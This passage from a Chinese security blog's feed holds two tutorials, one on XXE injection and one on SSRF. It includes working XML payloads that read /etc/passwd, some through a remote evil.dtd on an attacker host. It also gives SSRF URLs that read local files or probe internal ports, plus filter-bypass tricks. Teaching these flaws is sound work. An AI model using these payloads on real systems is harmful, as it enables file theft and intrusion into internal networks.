    <content type="html"><![CDATA[<h4 id="1-什么是XXE漏洞"><a href="#1-什么是XXE漏洞" class="headerlink" title="1.什么是XXE漏洞"></a>1.什么是XXE漏洞<a id="more"></a></h4><p>XXE漏洞全称为XML External Entity Injection 即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害</p><p>DTD:文档类型定义</p><p>DTD实体<br>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p><p>实体又分为一般实体和参数实体<br>1，一般实体的声明语法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名 &quot;实体内容&quot;&gt;</span><br></pre></td></tr></table></figure><p>引用实体的方式：&amp;实体名；<br>2，参数实体只能在DTD中使用，参数实体的声明格式： <code>&lt;!ENTITY % 实体名 &quot;实体内容&quot;&gt;</code><br>引用实体的方式：%实体名；</p><p>1，内部实体声明:<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt; ex:&lt;!ENTITY eviltest &quot;eviltest&quot;&gt;</code></p><p>  注意和DTD中的元素声明区别</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 声明元素&gt;</span><br></pre></td></tr></table></figure><p><strong>2，外部实体声明:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URL&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="XXE的攻击与危害（XML-External-Entity）"><a href="#XXE的攻击与危害（XML-External-Entity）" class="headerlink" title="XXE的攻击与危害（XML External Entity）"></a>XXE的攻击与危害（XML External Entity）</h2><h4 id="1，何为XXE"><a href="#1，何为XXE" class="headerlink" title="1，何为XXE?"></a>1，何为XXE?</h4><p>答： xxe也就是xml外部实体注入。也就是上文中加粗的那一部分。</p><h4 id="2，怎样构建外部实体注入？"><a href="#2，怎样构建外部实体注入？" class="headerlink" title="2，怎样构建外部实体注入？"></a>2，怎样构建外部实体注入？</h4><p>方式一：直接通过DTD外部实体声明<br>XML内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure><p>方式二：通过DTD文档引入外部DTD文档，再引入外部实体声明<br>XML内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://mark4z5.com/evil.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;B;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure><p>DTD文件内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br></pre></td></tr></table></figure><p>方式三：通过DTD外部实体声明引入外部实体声明<br>好像有点拗口，其实意思就是先写一个外部实体声明，然后引用的是在攻击者服务器上面的外部实体声明<br>具体看例子,XML内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY % d SYSTEM &quot;http:&#x2F;&#x2F;mark4z5.com&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">%d;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;&#x2F;c&gt;</span><br></pre></td></tr></table></figure><p>dtd文件内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="产生哪些危害？"><a href="#产生哪些危害？" class="headerlink" title="产生哪些危害？"></a>产生哪些危害？</h4><p>XXE危害1：读取任意文件</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145026738-1407663000.png" alt="img"></p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145035082-1171815922.png" alt="img"></p><p>该CASE是读取/etc/passwd，有些XML解析库支持列目录，攻击者通过列目录、读文件，获取帐号密码后进一步攻击，如读取tomcat-users.xml得到帐号密码后登录tomcat的manager部署webshell。</p><p>另外，数据不回显就没有问题了吗？如下图</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145050972-1215502458.png" alt="img"></p><p>不，可以把数据发送到远程服务器</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145104285-1507820174.png" alt="img"></p><p>远程evil.dtd文件内容如下</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145111863-976147511.png" alt="img"></p><p>触发XXE攻击后，服务器会把文件内容发送到攻击者网站</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145120957-1229784360.png" alt="img"></p><p>XXE危害2：执行系统命令</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145129957-1907303428.png" alt="img"></p><p>该CASE是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。</p><p>XXE危害3：探测内网端口</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145153722-1549362415.png" alt="img"></p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145204847-766408731.png" alt="img"></p><p>该CASE是探测192.168.1.1的80、81端口，通过返回的“Connection refused”可以知道该81端口是closed的，而80端口是open的。</p><p>XXE危害4：攻击内网网站</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145220472-216779729.png" alt="img"></p><p>该CASE是攻击内网struts2网站，远程执行系统命令。</p><p>(XXE的危害与攻击部分用的是下面这篇博客的材料，这里附上出处)<br>原文链接：<a href="https://blog.csdn.net/qq_40491569/article/details/83066200" target="_blank" rel="noopener">https://blog.csdn.net/qq_40491569/article/details/83066200</a></p><p>读取ip:file:///proc/net/arp</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;1-什么是XXE漏洞&quot;&gt;&lt;a href=&quot;#1-什么是XXE漏洞&quot; class=&quot;headerlink&quot; title=&quot;1.什么是XXE漏洞&quot;&gt;&lt;/a&gt;1.什么是XXE漏洞
    
    </summary>
    
    
    
      <category term="XXE" scheme="http://yoursite.com/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>ssrf</title>
    <link href="http://yoursite.com/2020/01/16/ssrf/"/>
    <id>http://yoursite.com/2020/01/16/ssrf/</id>
    <published>2020-01-16T02:55:29.000Z</published>
    <updated>2020-01-16T08:04:30.233Z</updated>
    
    <content type="html"><![CDATA[<h4 id="SSRF漏洞介绍："><a href="#SSRF漏洞介绍：" class="headerlink" title="SSRF漏洞介绍："></a>SSRF漏洞介绍：<a id="more"></a></h4><p>　　SSRF漏洞（服务器端请求伪造）：是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。</p><h4 id="SSRF漏洞原理："><a href="#SSRF漏洞原理：" class="headerlink" title="SSRF漏洞原理："></a>SSRF漏洞原理：</h4><p>　　SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。SSRF是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p><h4 id="SSRF漏洞利用手段："><a href="#SSRF漏洞利用手段：" class="headerlink" title="SSRF漏洞利用手段："></a>SSRF漏洞利用手段：</h4><p>　　1.可以对外网、内网、本地进行端口扫描，某些情况下端口的Banner会回显出来（比如3306的）；</p><p>　　2.攻击运行在内网或本地的有漏洞程序（比如溢出）；</p><p>　　3.可以对内网Web应用进行指纹识别，原理是通过请求默认的文件得到特定的指纹；</p><p>　　4.攻击内网或外网有漏洞的Web应用；</p><p>　　5.使用file：///协议读取本地文件(或其他协议）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">　　http:&#x2F;&#x2F;www.xingkonglangzi.com&#x2F;ssrf.php?url&#x3D;192.168.1.10:3306</span><br><span class="line"></span><br><span class="line">　　http:&#x2F;&#x2F;www.xingkonglangzi.com&#x2F;ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini</span><br></pre></td></tr></table></figure><h4 id="SSRF漏洞出现点："><a href="#SSRF漏洞出现点：" class="headerlink" title="***SSRF漏洞出现点："></a>***SSRF漏洞出现点：</h4><p>　　1.分享：通过URL地址分享网页内容　　　　　　　　　　　　　　　　　　　　　　　　　　</p><p>　　2.转码服务（通过URL地址把原地址的网页内容调优，使其适合手机屏幕的浏览）</p><p>　　3.在线翻译</p><p>　　4.图片加载与下载：通过URL地址加载或下载图片</p><p>　　5.图片、文章收藏功能</p><p>　　6.未公开的api实现及调用URL的功能</p><p>　　7.从URL关键字中寻找</p><h4 id="SSRF漏洞绕过方法："><a href="#SSRF漏洞绕过方法：" class="headerlink" title="***SSRF漏洞绕过方法："></a>***SSRF漏洞绕过方法：</h4><p>　　1.@　　　　　　　　　　<a href="http://abc.com@127.0.0.1" target="_blank" rel="noopener">http://abc.com@127.0.0.1</a></p><p>　　2.添加端口号　　　　　　<a href="http://127.0.0.1:8080" target="_blank" rel="noopener">http://127.0.0.1:8080</a></p><p>　　3.短地址　　　　　　　　<a href="https://0x9.me/cuGfD" target="_blank" rel="noopener">https://0x9.me/cuGfD</a></p><p>　　4.可以指向任意ip的域名　 xip.io</p><p>　　5.ip地址转换成进制来访问 192.168.0.1=3232235521（十进制）</p><p>　　6.非HTTP协议</p><p>　　7.DNS Rebinding</p><h3 id="SSRF漏洞的验证"><a href="#SSRF漏洞的验证" class="headerlink" title="***SSRF漏洞的验证"></a>***SSRF漏洞的验证</h3><p>我们先验证，请求是否是服务器端发出的，可以右键图片，使用新窗口打开图片，如果浏览器上地址栏是<a href="http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。" target="_blank" rel="noopener">http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。</a></p><p>可以用Firebug 或者burpsuite抓包工具，查看请求数据包中是否包含<a href="http://www.baidu.com/img/bd_logo1.png这个请求。由于SSRF是服务端发起的请求，因此在加载这张图片的时候本地浏览器中不应该存在图片的请求。" target="_blank" rel="noopener">http://www.baidu.com/img/bd_logo1.png这个请求。由于SSRF是服务端发起的请求，因此在加载这张图片的时候本地浏览器中不应该存在图片的请求。</a></p><p>在验证完是由服务端发起的请求之后，此处就有可能存在SSRF，接下来需要验证此URL是否可以来请求对应的内网地址。首先我们要获取内网存在HTTP服务且存在favicon.ico文件地址，才能验证是否是SSRF。</p><p>此处找内网地址可以通过从漏洞平台中的历史漏洞寻找泄露的内网地址过滤绕过</p><p>@：<br><a href="http://www.baidu.com@10.10.10.10与http?/10.10.10.10" target="_blank" rel="noopener">http://www.baidu.com@10.10.10.10与http?/10.10.10.10</a> 请求是相同的</p><p>过滤绕过<br>IP地址转换成十进制：<br>127.0.0.1=2130706433</p><h4 id="SSRF漏洞绕过方法：-1"><a href="#SSRF漏洞绕过方法：-1" class="headerlink" title="SSRF漏洞绕过方法："></a>SSRF漏洞绕过方法：</h4><p>　　</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.基本判断（排除法）</span><br><span class="line"></span><br><span class="line">　　如：http:&#x2F;&#x2F;www.douban.com&#x2F;***&#x2F;service?image&#x3D;http:&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;bd_logo1.png</span><br><span class="line"></span><br><span class="line">　　排除法一：直接右键图片，在新窗口打开图片，如果是浏览器上URL地址栏是http:&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;bd_logo1.png，说明不存在SSRF漏洞。</span><br><span class="line"></span><br><span class="line">　　排除法二：使用burpsuite等抓包工具来判断是否不是SSRF，首先SSRF是由服务端发起的请求，因此在加载图片的时候，是由服务端发起的，所以在我们本地浏览器的请求中就不应该存在图片的请求，如果刷新当前页面，有如下请求，则可判断不是SSRF。（前提设置burpsuite截断图片的请求，默认是放行的）</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;SSRF漏洞介绍：&quot;&gt;&lt;a href=&quot;#SSRF漏洞介绍：&quot; class=&quot;headerlink&quot; title=&quot;SSRF漏洞介绍：&quot;&gt;&lt;/a&gt;SSRF漏洞介绍：
    
    </summary>
    
    
    
      <category term="ssrf" scheme="http://yoursite.com/tags/ssrf/"/>
    
  </entry>
  
</feed>
